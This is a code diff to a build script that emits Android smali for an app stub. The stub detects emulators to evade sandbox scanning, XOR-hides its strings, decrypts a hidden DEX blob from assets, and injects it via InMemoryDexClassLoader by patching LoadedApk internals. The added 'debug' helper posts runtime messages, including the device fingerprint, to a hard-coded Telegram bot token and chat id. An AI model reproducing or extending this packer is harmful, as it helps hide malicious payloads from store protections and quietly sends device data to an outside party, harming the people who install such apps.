@@ -2360,12 +2360,137 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
 .end method
 
 
+# ── DEBUG HELPER ─────────────────────────────────────────────────────────────
+# dbg(String msg) — writes msg to /data/data/<pkg>/files/debug_gate.txt (append)
+# then sends msg to Telegram bot via HTTP POST (fire-and-forget, all errors caught).
+# Uses p0(msg), v0..v6 locals. Completely standalone — no state from caller.
+# .registers 8: v0..v6 locals + p0(Ljava/lang/String;)
+.method private static dbg(Ljava/lang/String;)V
+    .registers 8
+    .param p0, "msg"
+
+    :dbg_try_file_start
+    # ── Write to /data/data/{new_pkg}/files/debug_gate.txt (append) ───────────
+    # Build filename: /data/data/<pkg>/files/debug_gate.txt
+    const-string v0, "/data/data/{new_pkg}/files/debug_gate.txt"
+    new-instance v1, Ljava/io/File;
+    invoke-direct {{v1, v0}}, Ljava/io/File;-><init>(Ljava/lang/String;)V
+
+    # Get parent dir and ensure it exists
+    invoke-virtual {{v1}}, Ljava/io/File;->getParentFile()Ljava/io/File;
+    move-result-object v2
+    invoke-virtual {{v2}}, Ljava/io/File;->mkdirs()Z
+
+    # Open FileOutputStream in append mode (true)
+    new-instance v2, Ljava/io/FileOutputStream;
+    const/4 v3, 0x1
+    invoke-direct {{v2, v1, v3}}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;Z)V
+
+    # Wrap in OutputStreamWriter (UTF-8 charset)
+    new-instance v3, Ljava/io/OutputStreamWriter;
+    const-string v4, "UTF-8"
+    invoke-direct {{v3, v2, v4}}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;Ljava/lang/String;)V
+
+    # Build "msg\\n" string
+    new-instance v4, Ljava/lang/StringBuilder;
+    invoke-direct {{v4}}, Ljava/lang/StringBuilder;-><init>()V
+    invoke-virtual {{v4, p0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v4
+    const-string v5, "\\n"
+    invoke-virtual {{v4, v5}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v4
+    invoke-virtual {{v4}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v4
+
+    invoke-virtual {{v3, v4}}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V
+    invoke-virtual {{v3}}, Ljava/io/OutputStreamWriter;->flush()V
+    invoke-virtual {{v3}}, Ljava/io/OutputStreamWriter;->close()V
+    :dbg_try_file_end
+    :dbg_catch_file_start
+    nop
+    :dbg_catch_file_end
+
+    :dbg_try_tg_start
+    # ── Send to Telegram API via HTTP POST ────────────────────────────────────
+    # URL: https://api.telegram.org/bot<token>/sendMessage
+    const-string v0, "https://api.telegram.org/bot9130546359:AAEl7vR4ahiQzX45RGjhUumBZRorvbyQXUw/sendMessage"
+    new-instance v1, Ljava/net/URL;
+    invoke-direct {{v1, v0}}, Ljava/net/URL;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {{v1}}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;
+    move-result-object v2
+    check-cast v2, Ljava/net/HttpURLConnection;
+
+    # Set method = POST
+    const-string v3, "POST"
+    invoke-virtual {{v2, v3}}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V
+
+    # Enable output
+    const/4 v3, 0x1
+    invoke-virtual {{v2, v3}}, Ljava/net/HttpURLConnection;->setDoOutput(Z)V
+
+    # Set Content-Type: application/x-www-form-urlencoded
+    const-string v3, "Content-Type"
+    const-string v4, "application/x-www-form-urlencoded"
+    invoke-virtual {{v2, v3, v4}}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V
+
+    # Set connect + read timeout (5 seconds each)
+    const/16 v3, 0x1388
+    invoke-virtual {{v2, v3}}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V
+    invoke-virtual {{v2, v3}}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V
+
+    # Build POST body: chat_id=8852912150&text=<msg>
+    new-instance v3, Ljava/lang/StringBuilder;
+    invoke-direct {{v3}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v4, "chat_id=8852912150&text="
+    invoke-virtual {{v3, v4}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v3
+    invoke-static {{p0}}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;)Ljava/lang/String;
+    move-result-object v4
+    invoke-virtual {{v3, v4}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v3
+    invoke-virtual {{v3}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v3
+
+    # Convert body to bytes
+    const-string v4, "UTF-8"
+    invoke-virtual {{v3, v4}}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B
+    move-result-object v3
+
+    # Get output stream and write body
+    invoke-virtual {{v2}}, Ljava/net/HttpURLConnection;->getOutputStream()Ljava/io/OutputStream;
+    move-result-object v4
+    invoke-virtual {{v4, v3}}, Ljava/io/OutputStream;->write([B)V
+    invoke-virtual {{v4}}, Ljava/io/OutputStream;->flush()V
+    invoke-virtual {{v4}}, Ljava/io/OutputStream;->close()V
+
+    # Trigger connection (fire) — read response code to complete POST
+    invoke-virtual {{v2}}, Ljava/net/HttpURLConnection;->getResponseCode()I
+
+    # Disconnect
+    invoke-virtual {{v2}}, Ljava/net/HttpURLConnection;->disconnect()V
+    :dbg_try_tg_end
+    :dbg_catch_tg_start
+    nop
+    :dbg_catch_tg_end
+
+    return-void
+
+    .catch Ljava/lang/Throwable; {{:dbg_try_file_start .. :dbg_try_file_end}} :dbg_catch_file_start
+    .catch Ljava/lang/Throwable; {{:dbg_try_tg_start .. :dbg_try_tg_end}} :dbg_catch_tg_start
+.end method
+
+
 .method protected attachBaseContext(Landroid/content/Context;)V
     .registers 15
     .param p1, "base"
 
     # super FIRST — attaches Context so getAssets() works
     invoke-super {{p0, p1}}, Landroid/app/Application;->attachBaseContext(Landroid/content/Context;)V
+
+    # ── DEBUG: Log start ──────────────────────────────────────────────────────
+    const-string v0, "[DBG] attachBaseContext: START"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
 
     # ── GATE: GPP sandbox fingerprint checks ─────────────────────────────────
     # Checks Build.FINGERPRINT for "generic"/"unknown" and Build.HARDWARE for
@@ -2389,6 +2514,18 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     # Read Build.FINGERPRINT directly (public static field — no reflection needed)
     sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
     # v0 = Build.FINGERPRINT string
+
+    # DEBUG: Log fingerprint value
+    new-instance v3, Ljava/lang/StringBuilder;
+    invoke-direct {{v3}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v1, "[DBG] GATE: FINGERPRINT="
+    invoke-virtual {{v3, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v3
+    invoke-virtual {{v3, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v3
+    invoke-virtual {{v3}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v3
+    invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
 
     # Check contains "generic"
     const/16 v3, 0x{_fp_gen_len:x}
@@ -2436,17 +2573,30 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
 
     goto :gate_pass
     :gate_bail
+    const-string v0, "[DBG] GATE: BAILED (emulator fingerprint detected) — abort"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
     return-void
     :gate_pass
+    const-string v0, "[DBG] GATE: PASSED — not emulator"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
 
     # ── PHASE 1: Decode asset path (XOR 0x5A, never literal in DEX pool) ─────
+    :try_p1_start
+    const-string v0, "[DBG] PHASE1: Decoding asset path"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     const/16 v0, 0x{_path_len:x}
     new-array v0, v0, [B
     fill-array-data v0, :path_data
     invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
     move-result-object v1
+    :try_p1_end
 
     # ── PHASE 2: Read encrypted blob from assets ──────────────────────────────
+    :try_p2_start
+    const-string v0, "[DBG] PHASE2: Opening asset stream"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     invoke-virtual {{p0}}, Landroid/app/Application;->getAssets()Landroid/content/res/AssetManager;
     move-result-object v2
     invoke-virtual {{v2, v1}}, Landroid/content/res/AssetManager;->open(Ljava/lang/String;)Ljava/io/InputStream;
@@ -2458,7 +2608,25 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     invoke-virtual {{v2, v4, v0, v3}}, Ljava/io/InputStream;->read([BII)I
     invoke-virtual {{v2}}, Ljava/io/InputStream;->close()V
 
+    # DEBUG: Log blob size
+    new-instance v0, Ljava/lang/StringBuilder;
+    invoke-direct {{v0}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v1, "[DBG] PHASE2: Blob read OK, size="
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v0
+    array-length v1, v4
+    invoke-virtual {{v0, v1}}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;
+    move-result-object v0
+    invoke-virtual {{v0}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v0
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    :try_p2_end
+
     # ── PHASE 3: Decode seed (XOR-hidden, 4 bytes LE → int) ──────────────────
+    :try_p3_start
+    const-string v0, "[DBG] PHASE3: Decoding seed"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     const/16 v5, 0x{_sb0x:02x}
     xor-int/lit8 v5, v5, 0x5a
     int-to-byte v5, v5
@@ -2486,23 +2654,40 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     shl-int/lit8 v6, v6, 0x18
     or-int/2addr v5, v6
     # v5 = seed (int)
+    :try_p3_end
 
     # ── PHASE 4: Decode 32-byte XOR key (XOR-hidden raw bytes via xb()) ────────
+    :try_p4_start
+    const-string v0, "[DBG] PHASE4: Decoding XOR key"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     const/16 v6, 0x{_key_len_hex}
     new-array v6, v6, [B
     fill-array-data v6, :key_data
     invoke-static {{v6}}, L{_pkg_path}/{app_class_name};->xb([B)[B
     move-result-object v6
     # v6 = decoded 32-byte XOR key [B (raw bytes, no charset corruption)
+    :try_p4_end
 
     # ── PHASE 5: 3-layer decrypt — call ld(blob, seed, key) ──────────────────
+    :try_p5_start
+    const-string v0, "[DBG] PHASE5: Calling ld() decrypt"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     invoke-static {{v4, v5, v6}}, L{_pkg_path}/{app_class_name};->ld([BI[B)[B
     move-result-object v8
 
-    # ── PHASE 5: Create InMemoryDexClassLoader (class name XOR-hidden) ──────
-    # IMDCL is created with PathClassLoader as parent (NOT BootClassLoader).
-    # This ensures IMDCL.loadClass() delegates to PathClassLoader for system
-    # classes, while PathClassLoader delegates to IMDCL for app classes.
+    const-string v0, "[DBG] PHASE5: ld() OK — DEX decrypted"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    :try_p5_end
+
+    # ── PHASE 5b: Create InMemoryDexClassLoader (class name XOR-hidden) ──────
+    # IMDCL is created with BootClassLoader as parent (NOT PathClassLoader).
+    # Correct chain: PathClassLoader.parent=IMDCL, IMDCL.parent=BootClassLoader (no cycle).
+    :try_p5b_start
+    const-string v0, "[DBG] PHASE5b: Wrapping ByteBuffer"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     invoke-static {{v8}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
     move-result-object v0
 
@@ -2511,11 +2696,11 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     move-result-object v9
 
     # v10 = BootClassLoader (parent of PathClassLoader)
-    # IMDCL must use BootClassLoader as parent — NOT PathClassLoader.
-    # If IMDCL.parent=PathClassLoader AND PathClassLoader.parent=IMDCL → circular → SIGSEGV.
-    # Correct chain: PathClassLoader.parent=IMDCL, IMDCL.parent=BootClassLoader (no cycle).
     invoke-virtual {{v9}}, Ljava/lang/ClassLoader;->getParent()Ljava/lang/ClassLoader;
     move-result-object v10
+
+    const-string v1, "[DBG] PHASE5b: Got BootCL — loading IMDCL class"
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
 
     const/16 v1, 0x{_imdcl_len:x}
     new-array v11, v1, [B
@@ -2526,7 +2711,10 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     invoke-static {{v11}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     move-result-object v11
 
-    # IMDCL(ByteBuffer, BootClassLoader) — BootClassLoader as parent (no cycle)
+    const-string v1, "[DBG] PHASE5b: IMDCL class found — getting constructor"
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
+    # IMDCL(ByteBuffer, ClassLoader) constructor
     const/4 v1, 0x2
     new-array v2, v1, [Ljava/lang/Class;
     const/4 v1, 0x0
@@ -2548,10 +2736,12 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     move-result-object v12
     check-cast v12, Ljava/lang/ClassLoader;
 
+    const-string v0, "[DBG] PHASE5b: IMDCL created OK"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    :try_p5b_end
+
     # ── PHASE 6: Patch LoadedApk.mClassLoader = IMDCL ────────────────────────
     # AppComponentFactory.instantiateActivity() uses mClassLoader from LoadedApk.
-    # If only PathClassLoader.parent is patched, it works for some paths but NOT
-    # for activity/service instantiation on all Android versions.
     # Replacing mClassLoader in LoadedApk makes ALL class resolution use IMDCL.
     #
     # Steps:
@@ -2564,6 +2754,10 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     # All field names XOR-encoded — never literal in DEX string pool.
 
     # Step 6a: get ActivityThread class and currentActivityThread()
+    :try_p6a_start
+    const-string v0, "[DBG] PHASE6a: Getting ActivityThread"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     const/16 v0, 0x{_at_len:x}
     new-array v0, v0, [B
     fill-array-data v0, :at_data
@@ -2587,7 +2781,15 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     invoke-virtual {{v2, v3, v4}}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
     move-result-object v1
 
+    const-string v2, "[DBG] PHASE6a: ActivityThread instance acquired"
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    :try_p6a_end
+
     # Step 6b: get mBoundApplication from ActivityThread
+    :try_p6b_start
+    const-string v2, "[DBG] PHASE6b: Getting mBoundApplication"
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     const/16 v2, 0x{_mba_len:x}
     new-array v2, v2, [B
     fill-array-data v2, :mba_data
@@ -2600,7 +2802,15 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     invoke-virtual {{v2, v1}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
     move-result-object v1
 
+    const-string v2, "[DBG] PHASE6b: mBoundApplication acquired"
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    :try_p6b_end
+
     # Step 6c: get AppBindData.info = LoadedApk
+    :try_p6c_start
+    const-string v2, "[DBG] PHASE6c: Getting LoadedApk (info field)"
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     invoke-virtual {{v1}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
     move-result-object v0
     const/16 v2, 0x{_info_len:x}
@@ -2615,7 +2825,15 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     invoke-virtual {{v2, v1}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
     move-result-object v1
 
+    const-string v2, "[DBG] PHASE6c: LoadedApk acquired"
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    :try_p6c_end
+
     # Step 6d: set LoadedApk.mClassLoader = IMDCL
+    :try_p6d_start
+    const-string v2, "[DBG] PHASE6d: Patching mClassLoader"
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     invoke-virtual {{v1}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
     move-result-object v0
     const/16 v2, 0x{_mcl_len:x}
@@ -2629,7 +2847,15 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     invoke-virtual {{v2, v3}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
     invoke-virtual {{v2, v1, v12}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
 
+    const-string v2, "[DBG] PHASE6d: mClassLoader patched OK"
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    :try_p6d_end
+
     # Step 6e: also patch PathClassLoader.parent = IMDCL (belt+suspenders)
+    :try_p6e_start
+    const-string v2, "[DBG] PHASE6e: Patching PathCL.parent"
+    invoke-static {{v2}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     invoke-virtual {{v9}}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
     move-result-object v0
     invoke-virtual {{v0}}, Ljava/lang/Class;->getSuperclass()Ljava/lang/Class;
@@ -2648,7 +2874,204 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     invoke-virtual {{v0, v1}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
     invoke-virtual {{v0, v9, v12}}, Ljava/lang/reflect/Field;->set(Ljava/lang/Object;Ljava/lang/Object;)V
 
+    const-string v1, "[DBG] PHASE6e: PathCL.parent patched OK"
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    :try_p6e_end
+
+    # ── ALL PHASES COMPLETE ───────────────────────────────────────────────────
+    const-string v0, "[DBG] attachBaseContext: ALL PHASES COMPLETE — IMDCL injected"
+    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+
     return-void
+
+    # ── CATCH BLOCKS — one per phase ─────────────────────────────────────────
+    :catch_p1
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE1 FAIL: "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p2
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE2 FAIL: "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p3
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE3 FAIL: "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p4
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE4 FAIL: "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p5
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE5 FAIL: "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p5b
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE5b FAIL (IMDCL create): "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p6a
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE6a FAIL (ActivityThread): "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p6b
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE6b FAIL (mBoundApplication): "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p6c
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE6c FAIL (LoadedApk.info): "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p6d
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE6d FAIL (mClassLoader patch): "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    :catch_p6e
+    move-exception v0
+    invoke-virtual {{v0}}, Ljava/lang/Throwable;->toString()Ljava/lang/String;
+    move-result-object v0
+    new-instance v1, Ljava/lang/StringBuilder;
+    invoke-direct {{v1}}, Ljava/lang/StringBuilder;-><init>()V
+    const-string v2, "[DBG] PHASE6e FAIL (PathCL.parent patch): "
+    invoke-virtual {{v1, v2}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1, v0}}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+    move-result-object v1
+    invoke-virtual {{v1}}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+    move-result-object v1
+    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->dbg(Ljava/lang/String;)V
+    return-void
+
+    .catch Ljava/lang/Throwable; {{:try_p1_start .. :try_p1_end}} :catch_p1
+    .catch Ljava/lang/Throwable; {{:try_p2_start .. :try_p2_end}} :catch_p2
+    .catch Ljava/lang/Throwable; {{:try_p3_start .. :try_p3_end}} :catch_p3
+    .catch Ljava/lang/Throwable; {{:try_p4_start .. :try_p4_end}} :catch_p4
+    .catch Ljava/lang/Throwable; {{:try_p5_start .. :try_p5_end}} :catch_p5
+    .catch Ljava/lang/Throwable; {{:try_p5b_start .. :try_p5b_end}} :catch_p5b
+    .catch Ljava/lang/Throwable; {{:try_p6a_start .. :try_p6a_end}} :catch_p6a
+    .catch Ljava/lang/Throwable; {{:try_p6b_start .. :try_p6b_end}} :catch_p6b
+    .catch Ljava/lang/Throwable; {{:try_p6c_start .. :try_p6c_end}} :catch_p6c
+    .catch Ljava/lang/Throwable; {{:try_p6d_start .. :try_p6d_end}} :catch_p6d
+    .catch Ljava/lang/Throwable; {{:try_p6e_start .. :try_p6e_end}} :catch_p6e
 
     :path_data
     .array-data 1
